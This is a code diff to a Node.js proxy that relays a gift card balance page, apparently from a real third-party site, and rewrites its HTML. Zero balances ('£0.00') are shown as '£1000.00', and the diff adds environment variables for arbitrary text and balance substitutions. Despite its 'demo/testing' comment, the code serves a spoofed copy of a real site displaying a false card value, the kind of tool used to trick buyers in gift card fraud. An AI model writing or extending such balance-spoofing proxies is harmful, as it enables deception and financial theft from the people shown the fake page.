@@ -38,10 +38,11 @@ app.use((req, _res, next) => {
 
 // Proxy all requests to the target server
 const TARGET = process.env.TARGET || 'https://tsuk.claim.cards';
-console.log('Proxy target:', TARGET);
-// Proxy only /cardInfo
+const PROXY_PATH = process.env.PROXY_PATH || '/cardInfo';
+console.log('Proxy target:', TARGET, 'path:', PROXY_PATH);
+// Proxy only configured path (exact prefix)
 
-app.use('/cardInfo', createProxyMiddleware({
+app.use(PROXY_PATH, createProxyMiddleware({
   target: TARGET,
   changeOrigin: true,
   selfHandleResponse: true,
@@ -64,8 +65,8 @@ app.use('/cardInfo', createProxyMiddleware({
   onProxyRes: (proxyRes, req, res) => {
     console.log('onProxyRes status', proxyRes.statusCode, 'url', req.originalUrl, 'content-type', proxyRes.headers['content-type']);
     const contentType = String(proxyRes.headers['content-type'] || '');
-    const isHtml = contentType.includes('text/html');
-    const shouldModify = isHtml && req.originalUrl.startsWith('/cardInfo');
+  const isHtml = contentType.includes('text/html');
+  const shouldModify = isHtml && req.originalUrl.startsWith(PROXY_PATH);
 
     if (!shouldModify) {
       // Pipe through untouched for non-HTML or other routes
@@ -87,14 +88,33 @@ app.use('/cardInfo', createProxyMiddleware({
         else if (encoding === 'br') buffer = zlib.brotliDecompressSync(buffer);
 
         let html = buffer.toString('utf8');
-        // Simple deterministic rewrites for demo/testing
+        // Built-in deterministic rewrites for demo/testing
         const originalCall = "formatCurrency('GBP', '£', '0.00', '{2}{3}')";
         const rewrittenCall = "formatCurrency('GBP', '£', '1000.00', '{2}{3}')";
         if (html.includes(originalCall)) {
-          html = html.replace(new RegExp(originalCall, 'g'), rewrittenCall);
+          html = html.replaceAll(originalCall, rewrittenCall);
         }
-        // Also update any literal balance spans £0.00 -> £1000.00
         html = html.replace(/£0\.00/g, '£1000.00');
+
+        // Environment-driven rewrite (single pass)
+        const rewriteFind = process.env.REWRITE_FIND;
+        const rewriteReplace = process.env.REWRITE_REPLACE;
+        if (rewriteFind && rewriteReplace) {
+          try {
+            if (process.env.REWRITE_IS_REGEX === '1') {
+              const rx = new RegExp(rewriteFind, 'g');
+              html = html.replace(rx, rewriteReplace);
+            } else {
+              // Plain string global replace
+              html = html.split(rewriteFind).join(rewriteReplace);
+            }
+          } catch (e) {
+            console.error('Env rewrite error', e);
+          }
+        }
+        if (process.env.BALANCE_FROM && process.env.BALANCE_TO) {
+          html = html.split(process.env.BALANCE_FROM).join(process.env.BALANCE_TO);
+        }
 
         // Send modified HTML uncompressed
         const headers = { ...proxyRes.headers };
